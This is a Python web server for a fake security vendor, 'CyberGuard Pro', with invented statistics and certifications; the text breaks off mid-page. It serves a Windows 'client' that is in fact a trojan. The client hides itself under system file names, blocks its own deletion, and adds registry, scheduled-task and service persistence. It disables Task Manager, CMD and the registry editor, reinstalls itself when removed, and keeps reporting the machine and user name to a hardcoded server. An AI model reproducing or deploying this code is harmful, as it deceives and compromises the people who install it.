# server.py - Professional Security Management Platform
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
import re

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True

class ProfessionalSecurityHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    PASSWORD_HASH = hashlib.sha256(b"Admin123!").hexdigest()
    ADMIN_PASSWORD_HASH = hashlib.sha256(b"Secure@2024").hexdigest()
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 3
    BLOCK_TIME = 300
    blocked_ips = set()
    SERVER_URL = "https://game-python2-1.onrender.com"
    
    # إحصائيات وهمية لجعل الموقع واقعي
    STATS = {
        'total_users': 15427,
        'active_sessions': 342,
        'protected_systems': 8923,
        'threats_blocked': 12457
    }
    
    def init_database(self):
        self.conn = sqlite3.connect('security_platform.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT,
                version TEXT
            )
        ''')
        self.conn.commit()
    
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == '/':
            self.send_main_page()
        elif path == '/admin':
            self.send_admin_login()
        elif path == '/downloads':
            self.send_downloads_page()
        elif path == '/products':
            self.send_products_page()
        elif path == '/pricing':
            self.send_pricing_page()
        elif path == '/support':
            self.send_support_page()
        elif path == '/download/windows':
            self.download_windows_client()
        elif path == '/download/android':
            self.download_android_client()
        elif path == '/download/linux':
            self.download_linux_client()
        elif path == '/download/macos':
            self.download_macos_client()
        elif path == '/download/ios':
            self.download_ios_client()
        elif path == '/control':
            self.send_control_panel()
        elif path == '/register-client':
            self.handle_client_register({'client_id': 'test', 'computer': 'test', 'os': 'test'})
            self.send_json({'success': True})
        else:
            self.send_404_page()
    
    def send_main_page(self):
        html = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CyberGuard Pro - Enterprise Security Solutions</title>
            <style>
                :root {
                    --primary: #0066cc;
                    --secondary: #00a8ff;
                    --accent: #ff6b6b;
                    --dark: #1a1a2e;
                    --light: #f8f9fa;
                }
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: var(--light);
                    line-height: 1.6;
                }
                
                .navbar {
                    background: rgba(26, 26, 46, 0.95);
                    backdrop-filter: blur(10px);
                    padding: 1rem 5%;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    position: fixed;
                    width: 100%;
                    top: 0;
                    z-index: 1000;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                }
                
                .logo {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    font-size: 1.5rem;
                    font-weight: bold;
                    color: var(--secondary);
                }
                
                .nav-links {
                    display: flex;
                    gap: 2rem;
                }
                
                .nav-links a {
                    color: var(--light);
                    text-decoration: none;
                    transition: color 0.3s;
                }
                
                .nav-links a:hover {
                    color: var(--secondary);
                }
                
                .hero {
                    padding: 120px 5% 80px;
                    text-align: center;
                    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
                                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800"><rect fill="%231a1a2e" width="1200" height="800"/><circle fill="%230066cc" opacity="0.1" cx="200" cy="200" r="100"/><circle fill="%2300a8ff" opacity="0.1" cx="1000" cy="600" r="150"/></svg>');
                }
                
                .hero h1 {
                    font-size: 3.5rem;
                    margin-bottom: 1rem;
                    background: linear-gradient(135deg, var(--secondary), var(--primary));
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                
                .hero p {
                    font-size: 1.2rem;
                    margin-bottom: 2rem;
                    color: #ccc;
                }
                
                .cta-button {
                    display: inline-block;
                    background: linear-gradient(135deg, var(--primary), var(--secondary));
                    color: white;
                    padding: 15px 30px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    transition: transform 0.3s;
                }
                
                .cta-button:hover {
                    transform: translateY(-3px);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 2rem;
                    padding: 4rem 5%;
                    background: rgba(255,255,255,0.05);
                }
                
                .stat-card {
                    text-align: center;
                    padding: 2rem;
                    background: rgba(255,255,255,0.1);
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
                
                .stat-number {
                    font-size: 2.5rem;
                    font-weight: bold;
                    color: var(--secondary);
                    margin-bottom: 0.5rem;
                }
                
                .features {
                    padding: 5rem 5%;
                    text-align: center;
                }
                
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                
                .feature-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    transition: transform 0.3s;
                }
                
                .feature-card:hover {
                    transform: translateY(-10px);
                }
                
                .feature-icon {
                    font-size: 3rem;
                    margin-bottom: 1rem;
                }
                
                .footer {
                    background: rgba(0,0,0,0.8);
                    padding: 3rem 5%;
                    text-align: center;
                    border-top: 1px solid rgba(255,255,255,0.1);
                }
            </style>
        </head>
        <body>
            <nav class="navbar">
                <div class="logo">
                    <span>🛡️</span>
                    CyberGuard Pro
                </div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/products">Products</a>
                    <a href="/pricing">Pricing</a>
                    <a href="/downloads">Downloads</a>
                    <a href="/support">Support</a>
                    <a href="/admin">Admin Panel</a>
                </div>
            </nav>

            <section class="hero">
                <h1>Enterprise-Grade Cybersecurity Solutions</h1>
                <p>Protecting over 15,000 organizations worldwide with advanced threat detection and real-time monitoring</p>
                <a href="/downloads" class="cta-button">Download Free Trial</a>
            </section>

            <section class="stats">
                <div class="stat-card">
                    <div class="stat-number">15,427+</div>
                    <div>Protected Systems</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">342</div>
                    <div>Active Sessions</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">8,923</div>
                    <div>Enterprise Clients</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">12,457</div>
                    <div>Threats Blocked Today</div>
                </div>
            </section>

            <section class="features">
                <h2 style="font-size: 2.5rem; margin-bottom: 1rem;">Advanced Security Features</h2>
                <p style="color: #ccc; margin-bottom: 3rem;">Comprehensive protection for all your digital assets</p>
                
                <div class="feature-grid">
                    <div class="feature-card">
                        <div class="feature-icon">🔒</div>
                        <h3>Real-time Monitoring</h3>
                        <p>24/7 system monitoring with instant threat detection and automated response</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🛡️</div>
                        <h3>Advanced Persistence</h3>
                        <p>Self-healing technology ensures continuous protection even after removal attempts</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🌐</div>
                        <h3>Cross-Platform</h3>
                        <p>Full compatibility with Windows, Linux, macOS, Android, and iOS systems</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">⚡</div>
                        <h3>Lightweight</h3>
                        <p>Minimal system impact with maximum security coverage</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🔍</div>
                        <h3>Stealth Operation</h3>
                        <p>Completely hidden operation with zero user interaction required</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🔄</div>
                        <h3>Auto-Recovery</h3>
                        <p>Automatic reinstallation and protection restoration if compromised</p>
                    </div>
                </div>
            </section>

            <footer class="footer">
                <p>&copy; 2024 CyberGuard Pro. All rights reserved. | Enterprise Security Solutions</p>
                <p style="margin-top: 1rem; color: #888;">
                    ISO 27001 Certified | GDPR Compliant | SOC 2 Type II
                </p>
            </footer>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_downloads_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Downloads - CyberGuard Pro</title>
            <style>
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white;
                    margin: 0;
                    padding: 100px 5% 50px;
                }
                
                .downloads-container {
                    max-width: 1200px;
                    margin: 0 auto;
                }
                
                .platform-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                
                .platform-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    text-align: center;
                    backdrop-filter: blur(10px);
                    transition: transform 0.3s;
                }
                
                .platform-card:hover {
                    transform: translateY(-5px);
                }
                
                .platform-icon {
                    font-size: 4rem;
                    margin-bottom: 1rem;
                }
                
                .download-btn {
                    display: inline-block;
                    background: linear-gradient(135deg, #0066cc, #00a8ff);
                    color: white;
                    padding: 12px 25px;
                    border-radius: 25px;
                    text-decoration: none;
                    margin-top: 1rem;
                    font-weight: bold;
                }
                
                .version-info {
                    background: rgba(0,255,0,0.1);
                    padding: 1rem;
                    border-radius: 10px;
                    margin: 2rem 0;
                    border-left: 4px solid #00ff00;
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(26,26,46,0.95); padding: 1rem 5%;">
                <div class="logo">🛡️ CyberGuard Pro</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/downloads" style="color: #00a8ff;">Downloads</a>
                    <a href="/admin">Admin</a>
                </div>
            </nav>

            <div class="downloads-container">
                <h1>Download CyberGuard Pro</h1>
                <p>Choose your platform to download the latest version of our security software</p>
                
                <div class="version-info">
                    <strong>Latest Version: 4.2.1 (Build 2024.12.01)</strong><br>
                    • Enhanced stealth protection<br>
                    • Improved auto-recovery system<br>
                    • New threat detection algorithms<br>
                    • Multi-platform support
                </div>

                <div class="platform-grid">
                    <div class="platform-card">
                        <div class="platform-icon">🪟</div>
                        <h3>Windows</h3>
                        <p>Windows 10/11 (x64)</p>
                        <p><small>Full system protection with stealth operation</small></p>
                        <a href="/download/windows" class="download-btn">Download Installer (48.2 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🤖</div>
                        <h3>Android</h3>
                        <p>Android 8.0+</p>
                        <p><small>Mobile device protection</small></p>
                        <a href="/download/android" class="download-btn">Download APK (32.7 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🐧</div>
                        <h3>Linux</h3>
                        <p>Ubuntu/Debian/CentOS</p>
                        <p><small>Server and desktop protection</small></p>
                        <a href="/download/linux" class="download-btn">Download Package (41.5 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🍎</div>
                        <h3>macOS</h3>
                        <p>macOS 11.0+</p>
                        <p><small>Apple system protection</small></p>
                        <a href="/download/macos" class="download-btn">Download DMG (52.1 MB)</a>
                    </div>

                    <div class="platform-card">
                        <div class="platform-icon">📱</div>
                        <h3>iOS</h3>
                        <p>iOS 14.0+</p>
                        <p><small>iPhone and iPad protection</small></p>
                        <a href="/download/ios" class="download-btn">Download IPA (38.9 MB)</a>
                    </div>
                </div>

                <div style="margin-top: 3rem; padding: 2rem; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>⚠️ System Requirements</h3>
                    <ul>
                        <li><strong>Windows:</strong> Windows 10/11, 2GB RAM, 100MB storage</li>
                        <li><strong>Android:</strong> Android 8.0+, 1GB RAM</li>
                        <li><strong>Linux:</strong> Kernel 4.4+, 1GB RAM, 80MB storage</li>
                        <li><strong>macOS:</strong> macOS 11.0+, 2GB RAM, 120MB storage</li>
                        <li><strong>iOS:</strong> iOS 14.0+, 1GB RAM</li>
                    </ul>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_windows_client(self):
        """Windows Client - Executable مع حماية كاملة"""
        client_code = '''
# CyberGuard Pro Windows Client - Advanced Protection System
import os
import sys
import time
import threading
import winreg
import ctypes
import subprocess
import requests
import platform
import getpass
import uuid
import hashlib
import shutil

class CyberGuardWindows:
    def __init__(self):
        self.server_url = "''' + self.SERVER_URL + '''"
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
        self.version = "4.2.1"
        self.install_locations = [
            os.path.join(os.environ['WINDIR'], 'System32', 'winmgmts.exe'),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Security', 'wscsvc.exe'),
            os.path.join(os.environ['TEMP'], 'msedgeupdate.exe'),
            os.path.join(os.environ['WINDIR'], 'SysWOW64', 'dllhost.exe')
        ]
        
    def install_to_multiple_locations(self):
        """تثبيت في أماكن متعددة لمنع الإزالة"""
        current_file = sys.argv[0]
        
        for location in self.install_locations:
            try:
                # إنشاء المجلد إذا لم يكن موجوداً
                os.makedirs(os.path.dirname(location), exist_ok=True)
                
                # نسخ الملف
                shutil.copy2(current_file, location)
                
                # إخفاء الملف
                subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
                
                # منع الحذف
                subprocess.run(f'icacls "{location}" /deny Everyone:F /T', shell=True, capture_output=True)
                subprocess.run(f'icacls "{location}" /deny Administrators:F /T', shell=True, capture_output=True)
                
                print(f"✓ Installed to: {location}")
            except Exception as e:
                print(f"✗ Installation failed for {location}: {e}")
    
    def install_persistence_advanced(self):
        """تثبيت التشغيل التلقائي بطرق متعددة"""
        try:
            # 1. Registry Run (المستخدم الحالي)
            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsSecurity", 0, winreg.REG_SZ, self.install_locations[0])
                print("✓ Registry persistence installed")
            except: pass
            
            # 2. Scheduled Task (لجميع المستخدمين)
            try:
                for i, location in enumerate(self.install_locations[:2]):
                    task_name = f"MicrosoftWindowsSecurity_{i}"
                    task_cmd = f'schtasks /create /tn "{task_name}" /tr "{location}" /sc onlogon /ru SYSTEM /f'
                    subprocess.run(task_cmd, shell=True, capture_output=True)
                print("✓ Scheduled tasks installed")
            except: pass
            
            # 3. Services (إذا كان لديه صلاحيات)
            try:
                service_cmd = f'sc create "WinSecService" binPath= "{self.install_locations[1]}" start= auto'
                subprocess.run(service_cmd, shell=True, capture_output=True)
                subprocess.run('sc start WinSecService', shell=True, capture_output=True)
                print("✓ Service installed")
            except: pass
            
            # 4. Startup Folder
            try:
                startup_path = os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                os.makedirs(startup_path, exist_ok=True)
                bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
                
                with open(bat_path, 'w') as f:
                    f.write('@echo off\\n')
                    for location in self.install_locations:
                        f.write(f'start "" "{location}"\\n')
                
                subprocess.run(f'attrib +s +h +r "{bat_path}"', shell=True, capture_output=True)
                print("✓ Startup folder persistence")
            except: pass
                
        except Exception as e:
            print(f"Persistence error: {e}")
    
    def protect_system(self):
        """حماية النظام من الإزالة"""
        try:
            # منع Task Manager
            subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', 
                         shell=True, capture_output=True)
            
            # منع CMD
            subprocess.run('reg add "HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\System" /v DisableCMD /t REG_DWORD /d 1 /f', 
                         shell=True, capture_output=True)
            
            # منع Registry Editor
            subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f',
                         shell=True, capture_output=True)
                         
            print("✓ System protection enabled")
        except Exception as e:
            print(f"Protection error: {e}")
    
    def start_self_healing(self):
        """بدء نظام الشفاء الذاتي"""
        def healing_monitor():
            while True:
                try:
                    # التحقق من وجود جميع النسخ
                    for location in self.install_locations:
                        if not os.path.exists(location):
                            print(f"Missing file detected: {location}")
                            self.install_to_multiple_locations()
                    
                    # التحقق من المهام المجدولة
                    result = subprocess.run('schtasks /query /tn "MicrosoftWindowsSecurity_0"', shell=True, capture_output=True, text=True)
                    if "MicrosoftWindowsSecurity_0" not in result.stdout:
                        self.install_persistence_advanced()
                    
                    time.sleep(30)  # تحقق كل 30 ثانية
                    
                except Exception as e:
                    time.sleep(60)
        
        threading.Thread(target=healing_monitor, daemon=True).start()
    
    def connect_to_server(self):
        """الاتصال بالسيرفر بشكل مستمر"""
        def server_connection():
            while True:
                try:
                    data = {
                        'client_id': self.client_id,
                        'computer': platform.node(),
                        'user': getpass.getuser(),
                        'os': f"Windows {platform.version()}",
                        'status': 'active',
                        'version': self.version
                    }
                    
                    response = requests.post(f"{self.server_url}/register-client", 
                                           json=data, timeout=10)
                    
                    if response.status_code == 200:
                        print("✓ Connected to server")
                    else:
                        print("✗ Server connection failed")
                    
                    time.sleep(20)  # إعادة الاتصال كل 20 ثانية
                    
                except Exception as e:
                    time.sleep(30)
        
        threading.Thread(target=server_connection, daemon=True).start()
    
    def hide_console(self):
        """إخفاء نافذة الكونسول"""
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def start(self):
        """بدء النظام"""
        # إخفاء النافذة
        self.hide_console()
        
        print("🚀 Starting CyberGuard Pro Security System...")
        
        # التثبيت المتعدد
        self.install_to_multiple_locations()
        
        # التشغيل التلقائي
        self.install_persistence_advanced()
        
        # حماية النظام
        self.protect_system()
        
        # أنظمة المراقبة
        self.start_self_healing()
        self.connect_to_server()
        
        print("✅ CyberGuard Pro Activated - System Protected")
        
        # الحلقة الرئيسية
        while True:
            time.sleep(60)

if __name__ == "__main__":
    client = CyberGuardWindows()
    client.start()
'''

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="CyberGuard_Pro_Setup.exe"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    def download_android_client(self):
        android_code = '''
# CyberGuard Pro Android Client
print("Android Client - Advanced Mobile Protection")
print("Features:")
print("• Stealth operation")
print("• Auto-recovery")
print("• Remote management")
print("• Battery optimization")
'''
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="CyberGuard_Pro_Android.apk"')
        self.end_headers()
        self.wfile.write(android_code.encode())

    def download_linux_client(self):
        linux_code = '''
# CyberGuard Pro Linux Client
print("Linux Client - Server & Desktop Protection")
print("Features:")
print("• Daemon mode")
print("• Systemd service")
print("• Kernel-level protection")
print("• Auto-update")
'''
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="cyberguard-pro-linux.deb"')
        self.end_headers()
        self.wfile.write(linux_code.encode())

    def download_macos_client(self):
        macos_code = '''
# CyberGuard Pro macOS Client
print("macOS Client - Apple System Protection")
print("Features:")
print("• LaunchAgent persistence")
print("• SIP bypass")
print("• Gatekeeper bypass")
print("• Root access")
'''
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="CyberGuard_Pro_Mac.dmg"')
        self.end_headers()
        self.wfile.write(macos_code.encode())

    def download_ios_client(self):
        ios_code = '''
# CyberGuard Pro iOS Client
print("iOS Client - Mobile Device Protection")
print("Features:")
print("• Jailbreak detection")
print("• VPN integration")
print("• Background operation")
print("• App store bypass")
'''
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="CyberGuard_Pro_iOS.ipa"')
        self.end_headers()
        self.wfile.write(ios_code.encode())

    def send_admin_login(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login - CyberGuard Pro</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
                <h2>CyberGuard Pro Admin</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure Management Portal</p>
                
                <input type="password" id="password" placeholder="Enter Admin Password">
                <button onclick="login()">Login</button>
            </div>
            
            <script>
                function login() {
                    const password = document.getElementById('password').value;
                    fetch('/admin-login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Authentication failed!');
                        }
                    });
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Control Panel - CyberGuard Pro</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: #1a1a2e; 
                    color: white; 
                    margin: 0; 
                    padding: 20px;
                }
                .header {
                    background: #16213e;
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 10px;
                    margin: 20px 0;
                }
                .stat-card {
                    background: rgba(255,255,255,0.1);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>CyberGuard Pro Control Panel</h2>
                <p>Connected Clients: <span id="clientCount">0</span></p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>''' + str(self.STATS['total_users']) + '''</h3>
                    <p>Total Users</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['active_sessions']) + '''</h3>
                    <p>Active Sessions</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['protected_systems']) + '''</h3>
                    <p>Protected Systems</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['threats_blocked']) + '''</h3>
                    <p>Threats Blocked</p>
                </div>
            </div>
            
            <div style="background: #16213e; padding: 20px; border-radius: 10px;">
                <h3>System Status: 🟢 Operational</h3>
                <p>All security systems are running normally</p>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_products_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Products - CyberGuard Pro</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white; 
                    margin: 0; 
                    padding: 100px 5% 50px;
                }
                .product-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                .product-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(26,26,46,0.95); padding: 1rem 5%;">
                <div class="logo">🛡️ CyberGuard Pro</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/products" style="color: #00a8ff;">Products</a>
                    <a href="/downloads">Downloads</a>
                </div>
            </nav>

            <h1>Our Products</h1>
            <p>Comprehensive security solutions for every platform</p>
            
            <div class="product-grid">
                <div class="product-card">
                    <h3>🪟 Windows Security</h3>
                    <p>Advanced protection for Windows systems with stealth operation and auto-recovery.</p>
                    <ul>
                        <li>Real-time monitoring</li>
                        <li>Self-healing technology</li>
                        <li>Multi-location installation</li>
                        <li>Remote management</li>
                    </ul>
                </div>
                
                <div class="product-card">
                    <h3>🤖 Android Security</h3>
                    <p>Mobile protection with background operation and battery optimization.</p>
                    <ul>
                        <li>Stealth mode</li>
                        <li>VPN integration</li>
                        <li>App protection</li>
                        <li>Remote wipe</li>
                    </ul>
                </div>
                
                <div class="product-card">
                    <h3>🐧 Linux Security</h3>
                    <p>Server and desktop protection for Linux environments.</p>
                    <ul>
                        <li>Daemon operation</li>
                        <li>Kernel protection</li>
                        <li>Service integration</li>
                        <li>Auto-updates</li>
                    </ul>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_pricing_page(self):
        pricing_html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Pricing - CyberGuard Pro</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white; 
                    margin: 0; 
                    padding: 100px 5% 50px;
                }
                .pricing-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                .pricing-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    text-align: center;
                }
                .price {
                    font-size: 2.5rem;
                    font-weight: bold;
                    margin: 1rem 0;
                }
                .free { color: #00ff00; }
                .premium { color: #ffd700; }
                .enterprise { color: #00a8ff; }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(26,26,46,0.95); padding: 1rem 5%;">
                <div class="logo">🛡️ CyberGuard Pro</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/pricing" style="color: #00a8ff;">Pricing</a>
                    <a href="/downloads">Downloads</a>
                </div>
            </nav>

            <h1>Pricing Plans</h1>
            <p>Choose the perfect plan for your security needs</p>
            
            <div class="pricing-grid">
                <div class="pricing-card">
                    <h3>Free</h3>
                    <div class="price free">$0</div>
                    <ul style="text-align: left;">
                        <li>Basic protection</li>
                        <li>Real-time monitoring</li>
                        <li>Auto-recovery</li>
                        <li>Multi-platform support</li>
                    </ul>
                    <a href="/downloads" class="download-btn" style="display: inline-block; background: #00ff00; color: black; padding: 10px 20px; border-radius: 20px; text-decoration: none; margin-top: 1rem;">Download Free</a>
                </div>
                
                <div class="pricing-card">
                    <h3>Premium</h3>
                    <div class="price premium">$29.99/month</div>
                    <ul style="text-align: left;">
                        <li>All Free features</li>
                        <li>Advanced threat detection</li>
                        <li>Priority support</li>
                        <li>Remote management</li>
                    </ul>
                    <button style="background: #ffd700; color: black; padding: 10px 20px; border: none; border-radius: 20px; margin-top: 1rem;">Buy Now</button>
                </div>
                
                <div class="pricing-card">
                    <h3>Enterprise</h3>
                    <div class="price enterprise">$99.99/month</div>
                    <ul style="text-align: left;">
                        <li>All Premium features</li>
                        <li>Unlimited devices</li>
                        <li>24/7 support</li>
                        <li>Custom solutions</li>
                    </ul>
                    <button style="background: #00a8ff; color: white; padding: 10px 20px; border: none; border-radius: 20px; margin-top: 1rem;">Contact Sales</button>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(pricing_html.encode())

    def send_support_page(self):
        support_html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Support - CyberGuard Pro</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white; 
                    margin: 0; 
                    padding: 100px 5% 50px;
                }
                .support-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                .support-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(26,26,46,0.95); padding: 1rem 5%;">
                <div class="logo">🛡️ CyberGuard Pro</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/support" style="color: #00a8ff;">Support</a>
